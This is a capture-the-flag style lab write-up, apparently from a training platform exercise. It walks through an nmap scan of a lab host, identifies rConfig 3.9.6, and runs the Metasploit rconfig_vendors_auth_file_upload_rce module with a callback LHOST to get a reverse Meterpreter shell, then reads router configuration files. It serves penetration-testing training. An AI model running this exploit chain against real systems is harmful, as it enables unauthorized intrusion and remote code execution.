### Infiltrating Unix/Linux Exercise
 
IP: 10.129.201.101
 
---
 
### Question 1:
What language is the payload written in that gets uploaded when executing rconfig_vendors_auth_file_upload_rce?
 
The language the payload is written in can be assumed during our nmap scan, where it states that the site hosted on port 80 uses PHP/7.2.34; the output of the Metasploit exploit and it mentioning uploading a PHP file; or using whatweb on the target to find that it's built on PHP.
 
&#x1F6A9; found **PHP**.
 
---
 
### Question 2:
Exploit the target and find the hostname of the router in the devicedetails directory at the root of the file system.
 
I start off by running an nmap scan, constructing it like so.
 
```diff
+ $ sudo nmap -sV -A -sC 10.129.201.101
```
 
	PORT     STATE SERVICE  VERSION
	21/tcp   open  ftp      vsftpd 2.0.8 or later
	22/tcp   open  ssh      OpenSSH 7.4 (protocol 2.0)
	| ssh-hostkey:
	|   2048 2d:b2:23:75:87:57:b9:d2:dc:88:b9:f4:c1:9e:36:2a (RSA)
	|   256 c4:88:20:b0:22:2b:66:d0:8e:9d:2f:e5:dd:32:71:b1 (ECDSA)
	|_  256 e3:2a:ec:f0:e4:12:fc:da:cf:76:d5:43:17:30:23:27 (ED25519)
	80/tcp   open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
	|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
	|_http-title: Did not follow redirect to https://10.129.201.101/
	111/tcp  open  rpcbind  2-4 (RPC #100000)
	| rpcinfo:
	|   program version    port/proto  service
	|   100000  2,3,4        111/tcp   rpcbind
	|   100000  2,3,4        111/udp   rpcbind
	|   100000  3,4          111/tcp6  rpcbind
	|_  100000  3,4          111/udp6  rpcbind
	443/tcp  open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34)
	|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.2.34
	|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
	| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
	| Not valid before: 2021-09-24T19:29:26
	|_Not valid after:  2022-09-24T19:29:26
	|_ssl-date: TLS randomness does not represent time
	3306/tcp open  mysql    MySQL (unauthorized)
	Service Info: Host: the
 
I notice the web server running on port 80, so I navigate to it to see that it's rConfig, and in its footer it mentions the version it's running, rConfig Version 3.9.6.
 
Using Metasploit, I search for an exploit for this service and find one from 2021 mentioning RCE, so I decide to use it.
 
```diff
+ [msf](Jobs:0 Agents:0) use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
+ [msf](Jobs:0 Agents:0) exploit(linux/http/rconfig_vendors_auth_file_upload_rce) >> set RHOSTS 10.129.201.101
+ [msf](Jobs:0 Agents:0) exploit(linux/http/rconfig_vendors_auth_file_upload_rce) >> set LHOST 10.10.14.30
+ [msf](Jobs:0 Agents:0) exploit(linux/http/rconfig_vendors_auth_file_upload_rce) >> run
```
 
	RHOSTS => 10.129.201.101
	LHOST => 10.10.14.30
 
This results in a shell as the apache user. Navigating to the directory mentioned in the question, I find a file named edgerouter-isp.yml and decide to cat it.
 
```diff
+ (Meterpreter 1)(/home/rconfig/www/images/vendor) cd /
+ (Meterpreter 1)(/) > cd devicedetails
+ (Meterpreter 1)(/devicedetails) > ls
```
 
	Listing: /devicedetails
	=======================
	Mode              Size  Type  Last modified              Name
	----              ----  ----  -------------              ----
	100644/rw-r--r--  568   fil   2021-10-18 17:23:40 -0400  edgerouter-isp.yml
	100644/rw-r--r--  179   fil   2021-10-18 17:28:03 -0400  hostnameinfo.txt
 
```diff
+ (Meterpreter 1)(/devicedetails) > cat edgerouter-isp.yml
```
 
	me: configure top level configuration
	  cisco.ios.ios_config:
	    lines: hostname edgerouter-isp
	- name: configure interface settings
	  cisco.ios.ios_config:
	    lines:
	    - description test interface
	    - ip address 192.168.0.10 255.255.255.0
	    parents: interface gigabitethernet0/0
	- name: configure ip helpers on multiple interfaces
	  cisco.ios.ios_config:
	    lines:
	    - ip helper-address 10.10.10.15
	    - ip helper-address 10.10.11.12
	    parents: '{{ item }}'
	  with_items:
	  - interface Ethernet1
	  - interface Ethernet2
	  - interface GigabitEthernet1
 
From this output, I can see that the hostname of the router is edgerouter-isp.
 
&#x1F6A9; found **edgerouter-isp**.
